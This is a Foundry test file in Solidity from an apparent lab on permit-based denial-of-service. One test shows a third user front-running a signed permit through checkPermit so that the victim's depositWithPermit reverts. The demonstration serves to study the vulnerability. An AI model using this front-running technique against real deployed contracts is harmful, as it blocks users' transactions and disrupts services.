

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console2} from "forge-std/Test.sol";

import {TokenA} from "../../src/permit-dos-attack/TokenA.sol";
import {Bank} from "../../src/permit-dos-attack/Bank.sol";


contract PermitTest is Test {
      TokenA tokenA;
      Bank mybank; 
      uint256 internal constant userPrivateKey = 0xabc123;

      address user1 = vm.addr(userPrivateKey);
      address user2 = makeAddr("user2");
      address user3 = makeAddr("user3");

      function setUp() public {
            tokenA = new TokenA();
            tokenA.transfer(user1, 1000 ether);
            tokenA.transfer(user2, 1200 ether);
            mybank = new Bank(address(tokenA));
            
      }

      function testDeposit() public{
           uint256 amount = 12 ether;
           uint256 deadline = block.timestamp + 10 seconds; 
       
           console2.log("user1 balance: ", tokenA.balanceOf(user1));
            bytes32 digest = keccak256(abi.encode(user1, address(mybank), amount, deadline, mybank.nonces(user1))); // allow to deposit this much before the dealinde
           (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, digest);
           
           vm.prank(user1);
           tokenA.approve(address(mybank), amount);

           vm.startPrank(user2); // any user can call the following
           mybank.depositWithPermit(amount, user1, deadline, v, r, s);
           vm.stopPrank();

           console2.log("balance of bank: ", tokenA.balanceOf(address(mybank)));
      }
        function testFailDeposit() public{
           uint256 amount = 12 ether;
           uint256 deadline = block.timestamp + 10 seconds; 
       
           console2.log("user1 balance: ", tokenA.balanceOf(user1));
            bytes32 digest = keccak256(abi.encode(user1, address(mybank), amount, deadline, mybank.nonces(user1))); // allow to deposit this much before the dealinde
           (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, digest);

           vm.prank(user1);
           tokenA.approve(address(mybank), amount);

           // user3 front run with checkPermit and as a result, the depositWithPermit will fail 
           vm.prank(user3);
           mybank.checkPermit(amount, user1, deadline, v, r, s);         

         
           vm.startPrank(user2); // any user can call the following
           mybank.depositWithPermit(amount, user1, deadline, v, r, s);
           vm.stopPrank();

           console2.log("balance of bank: ", tokenA.balanceOf(address(mybank)));           
      }
}
